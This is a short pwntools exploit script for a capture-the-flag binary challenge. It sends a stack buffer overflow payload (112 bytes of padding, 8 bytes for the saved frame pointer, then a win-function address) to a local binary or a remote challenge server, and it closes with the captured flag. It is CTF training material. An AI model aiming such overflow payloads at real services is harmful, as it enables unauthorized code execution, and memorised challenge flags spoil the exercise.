# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"2")

    exe = './2'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # Attack goes here
    win_addr = 0x004013ec               # disas win
    offset = 112

    # ret2win
    payload = b"A" * offset
    payload += b"B" * 8                 # offset + 8
    payload += p64(win_addr)

    p.sendline(payload)  
    p.interactive()

solve()

# Orkom3{The~ Game~ Is~ On~_823b44a82e4127cc}